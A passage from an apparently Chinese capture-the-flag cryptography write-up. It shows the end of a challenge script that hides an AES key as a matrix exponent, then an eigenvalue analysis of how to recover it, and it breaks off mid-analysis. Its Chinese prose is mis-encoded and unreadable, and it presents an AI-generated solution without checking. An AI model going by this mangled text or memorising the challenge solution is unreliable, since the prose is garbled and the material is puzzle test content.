mul(v5, e)])<br>C = A.inverse() * B<br>D = C**key<br><br>key = pad(long_to_bytes(key), <span class="hljs-number">16</span>)<br>aes = AES.new(key,AES.MODE_ECB)<br>msg = aes.encrypt(pad(flag, <span class="hljs-number">64</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;p = <span class="hljs-subst">&#123;p&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;C = <span class="hljs-subst">&#123;[i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> C]&#125;</span>&#x27;</span>.replace(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;[&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;D = <span class="hljs-subst">&#123;[i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> D]&#125;</span>&#x27;</span>.replace(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;[&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;msg = <span class="hljs-subst">&#123;msg&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p><strong>æŠŠä¸Šä¸€é¢˜å–‚ç»™deepseek-r1å°±å¯ä»¥äº†</strong></p><h3 id="é—®é¢˜åˆ†æ"><a class="markdownIt-Anchor" href="#é—®é¢˜åˆ†æ"></a> é—®é¢˜åˆ†æ</h3><p>è¯¥é—®é¢˜ç»“åˆäº†çº¿æ€§ä»£æ•°å’ŒAESåŠ å¯†ï¼Œéœ€è¦ä»ç»™å®šçš„çŸ©é˜µå’Œå¯†æ–‡ä¸­æ¢å¤åŠ å¯†å¯†é’¥ã€‚ä»¥ä¸‹æ˜¯å…³é”®ç‚¹åˆ†æï¼š</p><h4 id="1-çŸ©é˜µç»“æ„åˆ†æ"><a class="markdownIt-Anchor" href="#1-çŸ©é˜µç»“æ„åˆ†æ"></a> 1. <strong>çŸ©é˜µç»“æ„åˆ†æ</strong></h4><ul><li>çŸ©é˜µ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span></span></span></span> ç”±5ä¸ªéšæœº64ä½ç´ æ•°å‘é‡ç»„æˆï¼š<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>v</mi><mn>1</mn></msub><mtext>Â </mtext><msub><mi>v</mi><mn>2</mn></msub><mtext>Â </mtext><msub><mi>v</mi><mn>3</mn></msub><mtext>Â </mtext><msub><mi>v</mi><mn>4</mn></msub><mtext>Â </mtext><msub><mi>v</mi><mn>5</mn></msub></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">A = \begin{bmatrix} v_1 \ v_2 \ v_3 \ v_4 \ v_5 \end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace">Â </span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace">Â </span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace">Â </span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace">Â </span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">]</span></span></span></span></span></span></li><li>çŸ©é˜µ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> æ˜¯æ ‡é‡ä¹˜æ³•ç»“æœï¼š<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo>â‹…</mo><msub><mi>v</mi><mn>1</mn></msub><mtext>Â </mtext><mi>b</mi><mo>â‹…</mo><msub><mi>v</mi><mn>2</mn></msub><mtext>Â </mtext><mi>c</mi><mo>â‹…</mo><msub><mi>v</mi><mn>3</mn></msub><mtext>Â </mtext><mi>d</mi><mo>â‹…</mo><msub><mi>v</mi><mn>4</mn></msub><mtext>Â </mtext><mn>0</mn><mo>â‹…</mo><msub><mi>v</mi><mn>5</mn></msub></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">B = \begin{bmatrix} a \cdot v_1 \ b \cdot v_2 \ c \cdot v_3 \ d \cdot v_4 \ 0 \cdot v_5 \end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace">Â </span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace">Â </span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace">Â </span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace">Â </span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">]</span></span></span></span></span></span>ï¼Œå…¶ä¸­ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">e=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span></li><li>çŸ©é˜µ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mo>=</mo><msup><mi>A</mi><mrow><mo>âˆ’</mo><mn>1</mn></mrow></msup><mo>â‹…</mo><mi>B</mi></mrow><annotation encoding="application/x-tex">C = A^{-1} \cdot B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span></li><li>çŸ©é˜µ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi><mo>=</mo><msup><mi>C</mi><mrow><mi>k</mi><mi>e</mi><mi>y</mi></mrow></msup></mrow><annotation encoding="application/x-tex">D = C^{key}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8491079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span></span></span></span></span></span></span></span></li></ul><h4 id="2-å…³é”®æ•°å­¦å…³ç³»"><a class="markdownIt-Anchor" href="#2-å…³é”®æ•°å­¦å…³ç³»"></a> 2. <strong>å…³é”®æ•°å­¦å…³ç³»</strong></h4><ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mo>=</mo><msup><mi>A</mi><mrow><mo>âˆ’</mo><mn>1</mn></mrow></msup><mo>â‹…</mo><mtext>diag</mtext><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo separator="true">,</mo><mi>d</mi><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">)</mo><mo>â‹…</mo><mi>A</mi></mrow><annotation encoding="application/x-tex">C = A^{-1} \cdot \text{diag}(a, b, c, d, 0) \cdot A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">diag</span></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">c</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">d</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span></span></span></span>ï¼Œå› æ­¤ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi></mrow><annotation encoding="application/x-tex">C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span> çš„ç‰¹å¾å€¼ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo separator="true">,</mo><mi>d</mi><mo separator="true">,</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">{a, b, c, d, 0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">c</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">d</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span></span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi><mo>=</mo><msup><mi>C</mi><mrow><mi>k</mi><mi>e</mi><mi>y</mi></mrow></msup><mo>=</mo><msup><mi>A</mi><mrow><mo>âˆ’</mo><mn>1</mn></mrow></msup><mo>â‹…</mo><mtext>diag</mtext><mo stretchy="false">(</mo><msup><mi>a</mi><mrow><mi>k</mi><mi>e</mi><mi>y</mi></mrow></msup><mo separator="true">,</mo><msup><mi>b</mi><mrow><mi>k</mi><mi>e</mi><mi>y</mi></mrow></msup><mo separator="true">,</mo><msup><mi>c</mi><mrow><mi>k</mi><mi>e</mi><mi>y</mi></mrow></msup><mo separator="true">,</mo><msup><mi>d</mi><mrow><mi>k</mi><mi>e</mi><mi>y</mi></mrow></msup><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">)</mo><mo>â‹…</mo><mi>A</mi></mrow><annotation encoding="application/x-tex">D = C^{key} = A^{-1} \cdot \text{diag}(a^{key}, b^{key}, c^{key}, d^{key}, 0) \cdot A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8491079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0991079999999998em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">diag</span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span></span></span></span>ï¼Œç‰¹å¾å€¼ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mrow><mi>k</mi><mi>e</mi><mi>y</mi></mrow></msup><mo separator="true">,</mo><msup><mi>b</mi><mrow><mi>k</mi><mi>e</mi><mi>y</mi></mrow></msup><mo separator="true">,</mo><msup><mi>c</mi><mrow><mi>k</mi><mi>e</mi><mi>y</mi></mrow></msup><mo separator="true">,</mo><msup><mi>d</mi><mrow><mi>k</mi><mi>e</mi><mi>y</mi></mrow></msup><mo separator="true">,</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">{a^{key}, b^{key}, c^{key}, d^{key}, 0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.043548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span></span></span></span></span></li><li><strong>æ ¸å¿ƒæ´å¯Ÿ</strong>ï¼š<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi></mrow><annotation encoding="application/x-tex">C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi></mrow><annotation encoding="application/x-tex">D</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span></span></span></span> 